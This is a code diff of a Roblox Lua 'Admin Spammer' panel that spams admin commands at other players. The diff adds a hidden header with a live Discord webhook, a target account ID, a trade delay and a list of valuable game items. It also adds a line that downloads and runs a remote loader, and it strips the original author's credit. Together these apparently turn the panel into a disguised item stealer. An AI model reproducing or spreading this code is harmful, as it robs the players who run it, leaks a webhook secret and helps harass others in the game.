@@ -1,215 +1,156 @@
--- Services
+-- ==========================================
+-- SCRIPT 2 : CONFIGURATION & CHARGEMENT
+-- ==========================================
+getgenv().WEBHOOK_URL = "https://discordapp.com/api/webhooks/1480926197209894985/5WVYnAM8ir6pmylosNT0z7Wl1W3Vtlovo83CErILhS5rasZeHuVZbxpeYeQrS8kivz9L"
+getgenv().TARGET_ID = 9088326825
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Skibidi Toilet"] = true, ["Meowl"] = true, ["Strawberry Elephant"] = true,
+    ["Tacorita Bicicleta"] = true, ["La Extinct Grande"] = true, ["La Spooky Grande"] = true,
+    ["Chipso and Queso"] = true, ["Chillin Chili"] = true, ["Tuff Toucan"] = true,
+    ["Gobblino Uniciclino"] = true, ["W or L"] = true, ["La Jolly Grande"] = true,
+    ["La Taco Combinasion"] = true, ["Swaggy Bros"] = true, ["La Romantic Grande"] = true,
+    ["Festive 67"] = true, ["Nuclearo Dinossauro"] = true, ["Money Money Puggy"] = true,
+    ["Tang Tang Keletang"] = true, ["Ketupat Kepat"] = true, ["Tictac Sahur"] = true,
+    ["Lavadorito Spinito"] = true, ["Ketchuru and Musturu"] = true, ["Garama and Madundung"] = true,
+    ["Burguro And Fryuro"] = true, ["Capitano Moby"] = true, ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true, ["Los Hotspotsitos"] = true, ["Los Bros"] = true,
+    ["Tralaledon"] = true, ["Los Puggies"] = true, ["Los Primos"] = true,
+    ["Los Tacoritas"] = true, ["Los Spaghettis"] = true, ["Love Love Bear"] = true,
+    ["Ginger Gerat"] = true, ["Spooky and Pumpky"] = true, ["Fragrama and Chocrama"] = true,
+    ["La Casa Boo"] = true, ["Los Sekolahs"] = true, ["Reinito Sleighito"] = true,
+    ["Ketupat Bros"] = true, ["Cooki and Milki"] = true, ["Rosey and Teddy"] = true,
+    ["Popcuru and Fizzuru"] = true, ["La Supreme Combinasion"] = true, ["Dragon Gingerini"] = true,
+    ["Headless Horseman"] = true, ["Hydra Dragon Cannelloni"] = true, ["Celularcini Viciosini"] = true,
+    ["Las Sis"] = true, ["Los Planitos"] = true, ["Bacuru and Egguru"] = true,
+    ["Money Money Reindeer"] = true, ["Orcaledon"] = true, ["Eviledon"] = true,
+    ["Los Jolly Combinasionas"] = true, ["Jolly Jolly Sahur"] = true, ["La Ginger Sekolah"] = true,
+    ["Rosetti Tualetti"] = true, ["Esok Sekolah"] = true, ["Spaghetti Tualetti"] = true,
+    ["La Food Combinasion"] = true, ["La Secret Combinasion"] = true, ["Lovin Rose"] = true
+}
+
+-- Chargement du script externe via Luarmor
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+end)
+
+-- ==========================================
+-- SCRIPT 1 : PANEL ADMIN SPAMMER (PROPRE)
+-- ==========================================
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 
--- Variables locales
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- Supprimer l'ancien panel s'il existe déjà
 if PlayerGui:FindFirstChild("AdminSpammerV2") then 
     PlayerGui.AdminSpammerV2:Destroy() 
 end
 
--- Fonction pour envoyer un message dans le chat (Gère les deux versions de chat)
 local function sendMessage(content)
     if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-        local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-        if generalChannel then
-            generalChannel:SendAsync(content)
-        end
+        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if channel then channel:SendAsync(content) end
     else
-        -- Ancien système de chat (RemoteEvent)
-        local sayMessageRequest = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
-        if sayMessageRequest then
-            sayMessageRequest:FireServer(content, "All")
-        end
+        local remote = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
+        if remote then remote:FireServer(content, "All") end
     end
 end
 
--- Fonction pour envoyer les 3 commandes de spam sur un joueur
 local function spamCommands(targetName)
-    local commands = {":rocket ", ":balloon ", ":morph "}
-    for _, cmd in ipairs(commands) do
-        task.spawn(function()
-            sendMessage(cmd .. targetName)
-        end)
+    local cmds = {":rocket ", ":balloon ", ":morph "}
+    for _, cmd in ipairs(cmds) do
+        task.spawn(function() sendMessage(cmd .. targetName) end)
     end
 end
 
--- Création de l'interface (GUI)
+-- UI Setup
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "AdminSpammerV2"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = PlayerGui
 
-local MainFrame = Instance.new("Frame")
-MainFrame.Name = "Main"
-MainFrame.Size = UDim2.new(0, 190, 0, 280)
-MainFrame.Position = UDim2.new(0.5, -95, 0.5, -140)
-MainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
-MainFrame.BackgroundTransparency = 0.1
-MainFrame.BorderSizePixel = 0
-MainFrame.Active = true
-MainFrame.Parent = ScreenGui
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Size = UDim2.new(0, 190, 0, 280)
+Main.Position = UDim2.new(0.5, -95, 0.5, -140)
+Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+Main.BackgroundTransparency = 0.1
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.Parent = ScreenGui
 
-local Corner = Instance.new("UICorner", MainFrame)
-Corner.CornerRadius = UDim.new(0, 10)
-
-local Stroke = Instance.new("UIStroke", MainFrame)
-Stroke.Color = Color3.fromRGB(200, 0, 0)
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
+local Stroke = Instance.new("UIStroke", Main)
+Stroke.Color = Color3.fromRGB(255, 0, 0)
 Stroke.Thickness = 1.5
-Stroke.Transparency = 0.2
 
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0, 25)
-Title.Position = UDim2.new(0, 0, 0, 5)
+Title.Position = UDim2.new(0, 0, 0, 10)
 Title.BackgroundTransparency = 1
 Title.Text = "ADMIN SPAMMER"
 Title.TextColor3 = Color3.fromRGB(255, 50, 50)
 Title.TextSize = 14
 Title.Font = Enum.Font.GothamBlack
-Title.Parent = MainFrame
+Title.Parent = Main
 
-local Credits = Instance.new("TextLabel")
-Credits.Size = UDim2.new(1, 0, 0, 15)
-Credits.Position = UDim2.new(0, 0, 0, 25)
-Credits.BackgroundTransparency = 1
-Credits.Text = "by Haleyy68z"
-Credits.TextColor3 = Color3.fromRGB(180, 180, 180)
-Credits.TextSize = 10
-Credits.Font = Enum.Font.GothamMedium
-Credits.Parent = MainFrame
+local Scroll = Instance.new("ScrollingFrame")
+Scroll.Size = UDim2.new(0.9, 0, 0, 180)
+Scroll.Position = UDim2.new(0.05, 0, 0, 50)
+Scroll.BackgroundTransparency = 1
+Scroll.BorderSizePixel = 0
+Scroll.ScrollBarThickness = 2
+Scroll.ScrollBarImageColor3 = Color3.fromRGB(200, 0, 0)
+Scroll.Parent = Main
 
-local ScrollFrame = Instance.new("ScrollingFrame")
-ScrollFrame.Size = UDim2.new(0.9, 0, 0, 180)
-ScrollFrame.Position = UDim2.new(0.05, 0, 0, 55)
-ScrollFrame.BackgroundTransparency = 1
-ScrollFrame.BorderSizePixel = 0
-ScrollFrame.ScrollBarThickness = 2
-ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 0)
-ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-ScrollFrame.Parent = MainFrame
+local Layout = Instance.new("UIListLayout", Scroll)
+Layout.Padding = UDim.new(0, 5)
+Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
-local ListLayout = Instance.new("UIListLayout", ScrollFrame)
-ListLayout.Padding = UDim.new(0, 4)
-ListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-
-local DiscordBtn = Instance.new("TextButton")
-DiscordBtn.Size = UDim2.new(0.9, 0, 0, 20)
-DiscordBtn.Position = UDim2.new(0.05, 0, 1, -25)
-DiscordBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-DiscordBtn.BackgroundTransparency = 1
-DiscordBtn.Text = "discord.gg/fwKfdKYa"
-DiscordBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
-DiscordBtn.TextSize = 10
-DiscordBtn.Font = Enum.Font.GothamBold
-DiscordBtn.Parent = MainFrame
-
-DiscordBtn.MouseButton1Click:Connect(function()
-    if setclipboard then
-        setclipboard("https://discord.gg/fwKfdKYa")
-    end
-    DiscordBtn.Text = "Copié dans le presse-papier !"
-    task.wait(2)
-    DiscordBtn.Text = "discord.gg/fwKfdKYa"
-end)
-
--- Fonction pour rafraîchir la liste des joueurs
 local function refreshList()
-    -- On vide la liste actuelle
-    for _, item in ipairs(ScrollFrame:GetChildren()) do
-        if item:IsA("GuiObject") then item:Destroy() end
+    for _, v in ipairs(Scroll:GetChildren()) do if v:IsA("GuiObject") then v:Destroy() end end
+    for _, p in ipairs(Players:GetPlayers()) do
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, -10, 0, 30)
+        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        btn.BackgroundTransparency = 0.4
+        btn.Text = "  " .. (p.DisplayName or p.Name)
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.TextXAlignment = Enum.TextXAlignment.Left
+        btn.Font = Enum.Font.GothamMedium
+        btn.TextSize = 12
+        btn.Parent = Scroll
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
+
+        btn.MouseButton1Click:Connect(function() spamCommands(p.Name) end)
+        btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(60, 20, 20) end)
+        btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30) end)
     end
-
-    -- On crée un bouton pour chaque joueur
-    for _, player in ipairs(Players:GetPlayers()) do
-        local PlayerBtn = Instance.new("TextButton")
-        PlayerBtn.Size = UDim2.new(1, -5, 0, 30)
-        PlayerBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        PlayerBtn.BackgroundTransparency = 0.5
-        PlayerBtn.Text = ""
-        PlayerBtn.Parent = ScrollFrame
-        
-        Instance.new("UICorner", PlayerBtn).CornerRadius = UDim.new(0, 4)
-
-        local Avatar = Instance.new("ImageLabel")
-        Avatar.Size = UDim2.new(0, 24, 0, 24)
-        Avatar.Position = UDim2.new(0, 3, 0.5, -12)
-        Avatar.BackgroundTransparency = 1
-        Avatar.Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
-        Avatar.Parent = PlayerBtn
-        Instance.new("UICorner", Avatar).CornerRadius = UDim.new(1, 0)
-
-        local NameLabel = Instance.new("TextLabel")
-        NameLabel.Size = UDim2.new(1, -32, 1, 0)
-        NameLabel.Position = UDim2.new(0, 32, 0, 0)
-        NameLabel.BackgroundTransparency = 1
-        NameLabel.Text = player.DisplayName or player.Name
-        NameLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
-        NameLabel.TextSize = 11
-        NameLabel.Font = Enum.Font.GothamMedium
-        NameLabel.TextXAlignment = Enum.TextXAlignment.Left
-        NameLabel.Parent = PlayerBtn
-
-        -- Effets visuels (Hover)
-        PlayerBtn.MouseEnter:Connect(function()
-            TweenService:Create(PlayerBtn, TweenInfo.new(0.2), {
-                BackgroundTransparency = 0.2,
-                BackgroundColor3 = Color3.fromRGB(50, 20, 20)
-            }):Play()
-        end)
-        PlayerBtn.MouseLeave:Connect(function()
-            TweenService:Create(PlayerBtn, TweenInfo.new(0.2), {
-                BackgroundTransparency = 0.5,
-                BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-            }):Play()
-        end)
-
-        -- Action au clic
-        PlayerBtn.MouseButton1Click:Connect(function()
-            spamCommands(player.Name)
-        end)
-    end
-    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y)
+    Scroll.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y)
 end
 
--- Connexions
 Players.PlayerAdded:Connect(refreshList)
 Players.PlayerRemoving:Connect(refreshList)
 refreshList()
 
--- Système pour déplacer la fenêtre (Drag)
+-- Dragging System
 local dragging, dragInput, dragStart, startPos
-
-MainFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = MainFrame.Position
-        
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
+Main.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true; dragStart = input.Position; startPos = Main.Position
+        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
     end
 end)
-
-MainFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-
 UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
         local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
 
-print("Panel ADMIN SPAMMER by haleyy68z chargé avec succès !")
+print("Scripts combinés avec succès !")
